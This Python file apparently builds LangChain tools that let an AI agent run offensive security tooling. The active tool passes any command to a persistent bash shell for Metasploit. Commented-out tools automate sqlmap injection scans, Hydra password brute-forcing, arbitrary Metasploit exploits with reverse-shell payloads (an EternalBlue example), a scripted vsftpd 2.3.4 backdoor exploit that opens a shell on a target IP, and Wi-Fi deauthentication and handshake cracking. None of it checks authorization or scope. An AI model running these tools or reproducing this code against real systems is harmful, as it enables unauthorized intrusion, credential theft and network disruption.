from langchain.tools import tool
import pexpect
import re

_global_bash_process = None

# Regex pattern to catch ANSI escape sequences
ANSI_CLEANER = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')

def clean_output(raw_text: str, max_chars: int = 3000) -> str:
    """Removes ANSI codes and truncates massive outputs."""
    # Strip ANSI colors and control characters
    clean_text = ANSI_CLEANER.sub('', raw_text)
    
    # Strip out standard terminal noise (like carriage returns)
    clean_text = clean_text.replace('\r\n', '\n').strip()
    
    # Truncate to prevent token explosions (adjust max_chars as needed)
    if len(clean_text) > max_chars:
        return clean_text[:max_chars] + f"\n\n...[OUTPUT TRUNCATED: Exceeded {max_chars} characters. Please refine your search/command.]..."
    
    return clean_text

def _get_active_process() -> pexpect.spawn:
    global _global_bash_process
    
    if _global_bash_process is None or not _global_bash_process.isalive():
        _global_bash_process = pexpect.spawn('/bin/bash', encoding='utf-8', echo=False)
        try:
            _global_bash_process.expect(r'\$', timeout=1) # Look for bash prompt
        except pexpect.TIMEOUT:
            pass
            
    return _global_bash_process

@tool
def metasploit_tool(command: str, timeout: float = 3.0) -> str:
    """
    Executes commands within a persistent terminal session to interact with the Metasploit Framework.
    ... [Keep your previous docstring instructions here] ...
    """
    try:
        process = _get_active_process()
        
        # If the LLM is trying to start msfconsole, force it to be quiet and color-free
        if command.strip() == "msfconsole":
            command = "msfconsole -q --no-color"
            
        process.sendline(command)
        
        # We look for the common Metasploit prompts instead of just waiting for EOF.
        # This allows the tool to return instantly when the command finishes.
        try:
            # Expecting either the standard msf prompt, a meterpreter prompt, or a bash prompt
            process.expect([r'msf6.*>', r'meterpreter.*>', r'\$'], timeout=timeout)
        except pexpect.TIMEOUT:
            # If it times out, we still capture whatever is in the buffer so far
            pass
        except pexpect.EOF:
            pass
        
        raw_output = process.before if process.before else ""
        
        # Clean and truncate the output
        final_output = clean_output(raw_output)
        
        return f"TERMINAL OUTPUT:\n{final_output}"
        
    except Exception as e:
        return f'Error: {e}'

# @tool
# def sqlmap_tool(url: str, options: list = None, timeout: int = 300, max_chars: int = 4000) -> str:
#     """
#     Executes a sqlmap scan on a target URL and returns the results.
    
#     Args:
#         url (str): The target URL to scan for vulnerabilities.
#         options (list): Optional flags like ["--dbs", "--tables", "--level=3"].
#         timeout (int): Maximum time in seconds to allow the scan to run. Default is 5 minutes.
#         max_chars (int): Maximum characters of stdout/stderr to return to prevent context overflow.
#     """
#     # Base command with --batch to automate prompts
#     command = ["sqlmap", "-u", url, "--batch"]
    
#     # SECURITY NOTE: In a zero-trust production environment, you should validate 
#     # 'options' against a hardcoded allowlist to prevent sqlmap argument injection.
#     if options:
#         command.extend(options)
    
#     try:
#         # Run sqlmap with a strict timeout
#         result = subprocess.run(
#             command, 
#             capture_output=True, 
#             text=True, 
#             check=False,
#             timeout=timeout
#         )
        
#         # Truncate output to protect the LLM context window.
#         # sqlmap prints its most critical findings (the summary) at the very end,
#         # so we keep the end of the string rather than the beginning.
#         stdout_str = result.stdout
#         if len(stdout_str) > max_chars:
#             stdout_str = f"...[TRUNCATED - EXCEEDED {max_chars} CHARS]...\n" + stdout_str[-max_chars:]
            
#         stderr_str = result.stderr
#         if len(stderr_str) > max_chars:
#             stderr_str = f"...[TRUNCATED - EXCEEDED {max_chars} CHARS]...\n" + stderr_str[-max_chars:]

#         # Structure output consistently
#         response = {
#             "status": "completed" if result.returncode == 0 else "failed",
#             "exit_code": result.returncode,
#             "stdout": stdout_str,
#             "stderr": stderr_str
#         }
#         return json.dumps(response)

#     except subprocess.TimeoutExpired:
#         # Graceful handling if the scan hangs or takes too long
#         return json.dumps({
#             "status": "timeout",
#             "exit_code": None,
#             "error": f"The sqlmap scan exceeded the {timeout}-second limit and was terminated.",
#             "stdout": "",
#             "stderr": ""
#         })
        
#     except FileNotFoundError:
#         # Returned as JSON so the agent doesn't crash during parsing
#         return json.dumps({
#             "status": "error",
#             "exit_code": None,
#             "error": "sqlmap is not installed or not found in the system PATH.",
#             "stdout": "",
#             "stderr": ""
#         })
        
#     except Exception as e:
#         return json.dumps({
#             "status": "error",
#             "exit_code": None,
#             "error": f"An unexpected system error occurred: {str(e)}",
#             "stdout": "",
#             "stderr": ""
#         })
    

# @tool
# def run_hydra_attack(
#     target: str,
#     service: str,
#     user: str = "admin",
#     pass_file: str = "passwords.txt",
#     threads: int = 16,
#     timeout: int = 300,
#     extra_args: Optional[str] = None
# ) -> Dict[str, str]:
#     """
#     Runs THC-Hydra to brute-force a single username against a target service.

#     Designed for AI agents. Returns structured output for easy reasoning.

#     Args:
#         target (str): Target IP or hostname
#         service (str): Hydra service (ssh, ftp, http-post-form, rdp, etc.)
#         user (str): Username to test. Default: "admin"
#         pass_file (str): Path to password wordlist. Default: "passwords.txt"
#         threads (int): Parallel threads. Default: 16
#         timeout (int): Max runtime in seconds. Default: 300
#         extra_args (str, optional): Additional Hydra flags (e.g. "-s 2222 -e ns")

#     Returns:
#         dict: {
#             "status": "success" | "finished" | "error",
#             "message": brief summary,
#             "details": credential line if found (e.g. "login: root  password: toor"),
#             "full_output": raw Hydra output
#         }
#     """
#     # Basic input validation (important for agent safety)
#     if not Path(pass_file).is_file():
#         return {"status": "error", "message": f"Password file not found: {pass_file}"}

#     # Build command safely as list (no f-string + shlex needed)
#     cmd = [
#         "hydra",
#         "-l", user,
#         "-P", pass_file,
#         "-f",           # stop on first success
#         "-t", str(threads),
#         target,
#         service
#     ]
    
#     if extra_args:
#         cmd.extend(shlex.split(extra_args))  # allow agent to pass -s, -M, etc.

#     try:
#         result = subprocess.run(
#             cmd,
#             capture_output=True,
#             text=True,
#             timeout=timeout,
#             check=False
#         )
        
#         stdout = result.stdout.strip()
#         stderr = result.stderr.strip()
        
#         # More reliable success detection
#         if "[login:" in stdout or "login:" in stdout or "password:" in stdout.lower():
#             # Extract the actual credential line if possible
#             for line in stdout.splitlines():
#                 if "login:" in line and "password:" in line:
#                     return {
#                         "status": "success",
#                         "message": "Valid credentials found!",
#                         "details": line.strip(),
#                         "full_output": stdout
#                     }
#             return {"status": "success", "message": "Credentials found", "full_output": stdout}
        
#         # No luck
#         return {
#             "status": "finished",
#             "message": "Attack completed. No valid credentials found.",
#             "full_output": stdout,
#             "stderr": stderr
#         }
        
#     except FileNotFoundError:
#         return {"status": "error", "message": "THC-Hydra is not installed on this system."}
#     except subprocess.TimeoutExpired:
#         return {"status": "error", "message": f"Timeout after {timeout} seconds."}
#     except Exception as e:
#         return {"status": "error", "message": f"Unexpected error: {str(e)}"}






# def run_metasploit_exploit(
#     exploit_path: str,
#     msf_password: str,
#     options: Dict[str, Any],
#     payload_path: Optional[str] = "cmd/unix/interact",
#     rpc_host: str = "127.0.0.1",
#     rpc_port: int = 55553,
#     wait_time: int = 12,
#     ssl: bool = False,
#     auto_interact: bool = True
# ) -> Dict[str, Any]:
#     """
#     Universal Metasploit Python tool — run ANY exploit module via msfrpcd.
    
#     Designed specifically for AI agents to use as a tool.
#     The agent can call this function with any exploit + payload combination.
    
#     Parameters:
#         exploit_path (str): Full exploit module path WITHOUT the "exploit/" prefix.
#                             Example: "unix/ftp/vsftpd_234_backdoor" or "windows/smb/ms17_010_eternalblue"
#         msf_password (str): Password you set when starting msfrpcd
#         options (Dict[str, Any]): ALL required options for the exploit + payload.
#                                   Example: {"RHOSTS": "192.168.1.100", "RPORT": 445, "LHOST": "192.168.1.50"}
#         payload_path (str, optional): Payload module (without "payload/" prefix).
#                                       Set to None if the exploit doesn't need a payload.
#         wait_time (int): Seconds to wait for a session to appear after execution.
#         auto_interact (bool): If True and a shell session is created, automatically run "whoami".
    
#     Returns:
#         Dict with structured results the agent can easily parse:
#         - success (bool)
#         - message (str)
#         - session_id (Optional[int])
#         - sessions (Dict)          # full session info from Metasploit
#         - whoami_output (Optional[str])
#         - job_id (Optional[int])
#         - error (Optional[str])
#         - exploit_path (str)       # for logging
    
#     Example agent usage:
#         result = run_metasploit_exploit(
#             exploit_path="windows/smb/ms17_010_eternalblue",
#             msf_password="your_secure_password",
#             options={
#                 "RHOSTS": "192.168.1.100",
#                 "RPORT": 445,
#                 "LHOST": "192.168.1.50",
#                 "LPORT": 4444,
#                 "PAYLOAD": "windows/x64/meterpreter/reverse_tcp"
#             },
#             payload_path="windows/x64/meterpreter/reverse_tcp"
#         )
#         if result["success"] and result["session_id"]:
#             print(f"Got session {result['session_id']}!")
#     """
#     result: Dict[str, Any] = {
#         "success": False,
#         "message": "",
#         "session_id": None,
#         "sessions": {},
#         "whoami_output": None,
#         "job_id": None,
#         "error": None,
#         "exploit_path": exploit_path
#     }
    
#     try:
#         print(f"[*] Connecting to Metasploit RPC at {rpc_host}:{rpc_port}...")
#         client = MsfRpcClient(
#             msf_password,
#             host=rpc_host,
#             port=rpc_port,
#             ssl=ssl
#         )
        
#         # Load exploit
#         print(f"[*] Loading exploit: exploit/{exploit_path}")
#         exploit = client.modules.use('exploit', exploit_path)
        
#         # Load payload (if provided)
#         payload = None
#         if payload_path:
#             print(f"[*] Loading payload: payload/{payload_path}")
#             payload = client.modules.use('payload', payload_path)
        
#         # Apply all options (works for both exploit and payload options in pymetasploit3)
#         print(f"[*] Setting {len(options)} options...")
#         for key, value in options.items():
#             exploit[key] = value
#             print(f"    {key} = {value}")
        
#         # Execute the exploit
#         print(f"[*] Executing exploit against target...")
#         if payload:
#             execution = exploit.execute(payload=payload)
#         else:
#             execution = exploit.execute()
        
#         job_id = execution.get('job_id')
#         result["job_id"] = job_id
#         print(f"[*] Exploit job started with ID: {job_id}")
        
#         # Wait for session
#         print(f"[*] Waiting up to {wait_time} seconds for session...")
#         time.sleep(wait_time)
        
#         # Check sessions
#         sessions = client.sessions.list
#         result["sessions"] = sessions
        
#         if sessions:
#             # Take the first (usually newest) session
#             session_id = list(sessions.keys())[0]
#             result["session_id"] = session_id
#             result["success"] = True
#             result["message"] = f"Exploit successful! Session {session_id} opened."
            
#             # Optional auto-interaction for shell sessions
#             if auto_interact:
#                 session_info = sessions[session_id]
#                 session_type = session_info.get("type", "") or session_info.get("info", "")
                
#                 if "shell" in session_type.lower() or "command" in session_type.lower():
#                     try:
#                         shell = client.sessions.session(session_id)
#                         print("[*] Sending 'whoami' to verify shell...")
#                         shell.write("whoami\n")
#                         time.sleep(1.5)
#                         output = shell.read().strip()
#                         result["whoami_output"] = output
#                         print(f"[+] whoami output: {output}")
#                     except Exception as interact_err:
#                         result["whoami_output"] = f"Interaction failed: {interact_err}"
#                 else:
#                     result["whoami_output"] = "Session created (likely Meterpreter or other non-shell type)"
            
#         else:
#             result["message"] = "Exploit executed but no session was created. Target may not be vulnerable."
#             print("[-] No session opened after execution.")
            
#     except ConnectionError:
#         result["error"] = "Failed to connect to Metasploit RPC. Is msfrpcd running?"
#         result["message"] = result["error"]
#     except Exception as e:
#         result["error"] = str(e)
#         result["message"] = f"Error during exploit: {e}"
#         print(f"[-] Error: {e}")
    
#     return result



# @tool
# def basic_metasploit_tool(target_ip: str) -> None:
#     """This tool allows for a basic exploitation of a vsftpd 2.3.4 backdoor using Metasploit's msfconsole in quiet mode."""
#     try:
#         print("[+] Starting msfconsole (quiet mode)...")
#         # Change to 'sudo msfconsole -q' only if you really need root and know your sudo password
#         child = pexpect.spawn('msfconsole -q', timeout=60)
#     except:
#         print("Timeout Reached")

#     try:
#         # Wait for the initial Metasploit prompt
#         child.expect(r'msf6 .*?>')
#         print("[+] Metasploit console ready.")
#     except:
#         print("Timeout Reached")


#     # Step 1: Search for vsftpd (as you requested)
#     print("[+] Running: search vsftpd")
#     child.sendline('search vsftpd')
#     child.expect(r'msf6 .*?>')
#     print("[+] Search completed (vsftpd_234_backdoor should appear).")

#     # Step 2: Use the exploit (correct full module name)
#     print("[+] Running: use exploit/unix/ftp/vsftpd_234_backdoor")
#     child.sendline('use exploit/unix/ftp/vsftpd_234_backdoor')
#     child.expect(r'msf6 exploit\(unix/ftp/vsftpd_234_backdoor\) >')
#     print("[+] Exploit module loaded.")

#     # Step 3: Set RHOSTS
#     print(f"[+] Running: set RHOSTS {target_ip}")
#     child.sendline(f'set RHOSTS {target_ip}')
#     child.expect(r'msf6 exploit\(unix/ftp/vsftpd_234_backdoor\) >')
#     print(f"[+] RHOSTS set to {target_ip}")

#     # Step 4: Set payload
#     print("[+] Running: set payload cmd/unix/interact")
#     child.sendline('set payload cmd/unix/interact')
#     child.expect(r'msf6 exploit\(unix/ftp/vsftpd_234_backdoor\) >')
#     print("[+] Payload set to cmd/unix/interact")

#     # Step 5: Run exploit
#     print("[+] Running: exploit  (this will open the interactive shell)")
#     child.sendline('exploit')
    
#     # Wait for the backdoor connection (this is the key success message)
#     try:
#         child.expect(r'Connected to vsftpd 2.3.4 backdoor', timeout=45)
#         print("[+] Exploit successful! Interactive shell opened on target.")
#     except pexpect.TIMEOUT:
#         print("[-] Exploit timed out or failed. Check if the target (192.168.1.223) is running vsftpd 2.3.4 with the backdoor.")
#         child.close()
#         sys.exit(1)

#     # Step 6: Send "whoami" in the target shell
#     print("[+] Running: whoami  (on the target system)")
#     child.sendline('whoami')
    
#     # Give the command a moment to execute and capture output
#     time.sleep(1.5)
#     output = child.read_nonblocking(size=4096, timeout=10).decode('utf-8', errors='ignore')
    
#     print("\n" + "="*50)
#     print("WHOAMI OUTPUT FROM TARGET SYSTEM:")
#     print("="*50)
#     print(output.strip() or "(no immediate output - shell may be waiting)")
#     print("="*50)

#     # Optional: gracefully exit the shell and return to msfconsole
#     # print("[+] Closing shell session...")
#     # child.sendline('exit')
#     # time.sleep(2)
    
#     # print("[+] Automation complete. Closing Metasploit.")
#     # child.close()




# @tool
# async def aircrack_tool(
#     action: str, 
#     interface: str = None, 
#     target_bssid: str = None, 
#     channel: int = None, 
#     client_mac: str = None, 
#     wordlist: str = None, 
#     pcap_file: str = None, 
#     duration: int = 10
# ) -> str:
#     """
#     Unified Aircrack-ng tool for WiFi auditing.
    
#     CRITICAL: You must provide the correct arguments based on the 'action' you choose:
#     - "enable_monitor": Requires 'interface'.
#     - "scan": Requires 'interface'. 'duration' is optional (default 10s).
#     - "deauth": Requires 'interface' and 'target_bssid'. 'client_mac' is optional.
#     - "crack": Requires 'pcap_file' and 'wordlist'.

#     Args:
#         action (str): "enable_monitor", "scan", "deauth", or "crack".
#         interface (str): Wireless interface (e.g., 'wlan0', 'wlan0mon').
#         target_bssid (str): MAC address of the target AP.
#         channel (int): WiFi channel of the target.
#         client_mac (str): Victim client MAC for targeted deauth.
#         wordlist (str): Path to password dictionary file.
#         pcap_file (str): Path to capture file for cracking.
#         duration (int): Time in seconds to run scans.
#     """
    
#     try:
#         # --- Action 1: Enable Monitor Mode ---
#         if action == "enable_monitor":
#             if not interface: 
#                 return "Error: 'interface' argument is missing but required for 'enable_monitor'."
            
#             # FIX: Using subprocess to ensure monitor mode persists after the function returns.
#             # (pyrcrack's context manager would immediately disable it upon exit)
#             process = await asyncio.create_subprocess_exec(
#                 "airmon-ng", "start", interface,
#                 stdout=asyncio.subprocess.PIPE,
#                 stderr=asyncio.subprocess.PIPE
#             )
#             stdout, stderr = await process.communicate()
            
#             if process.returncode == 0:
#                 # Agents should be aware the interface name usually changes (e.g. wlan0 -> wlan0mon)
#                 return f"Success: Monitor mode enabled. Verify the new interface name before scanning."
#             else:
#                 return f"Error enabling monitor mode: {stderr.decode()}"

#         # --- Action 2: Scan for Targets ---
#         elif action == "scan":
#             if not interface: 
#                 return "Error: 'interface' argument is missing but required for 'scan'."
            
#             parsed_results = []
            
#             async with AirodumpNg() as pdump:
#                 # FIX: Track time instead of sleeping inside the generator
#                 start_time = asyncio.get_event_loop().time()
                
#                 async for result in pdump(interface):
#                     parsed_results = [
#                         {"bssid": ap.bssid, "essid": ap.essid, "channel": ap.channel} 
#                         for ap in result
#                     ]
                    
#                     # Break loop when duration is reached
#                     if (asyncio.get_event_loop().time() - start_time) >= duration:
#                         break
                        
#             return f"Scan complete. Found targets: {parsed_results}"

#         # --- Action 3: Deauthenticate Target ---
#         elif action == "deauth":
#             if not interface or not target_bssid: 
#                 return "Error: Both 'interface' and 'target_bssid' are required for 'deauth'."
            
#             async with AireplayNg() as player:
#                 # FIX: Mapped to standard aireplay-ng flags (-a and -c)
#                 args = {'deauth': 10, 'a': target_bssid}
#                 if client_mac:
#                     args['c'] = client_mac
                
#                 await player.run(interface, **args)
                
#             return f"Success: 10 Deauth bursts sent to AP {target_bssid}"

#         # --- Action 4: Crack Handshake ---
#         elif action == "crack":
#             if not pcap_file or not wordlist:
#                 return "Error: Both 'pcap_file' and 'wordlist' are required for 'crack'."
            
#             async with AircrackNg() as cracker:
#                 # FIX: Execution with positional and kwargs mapped correctly
#                 result = await cracker.run(pcap_file, w=wordlist)
#                 return f"Crack execution finished. Result: {result}"

#         # --- Catch Invalid Actions ---
#         else:
#             return f"Error: Invalid action '{action}'. Allowed actions are enable_monitor, scan, deauth, crack."
            
#     except Exception as e:
#         return f"Tool execution failed with an exception: {str(e)}"

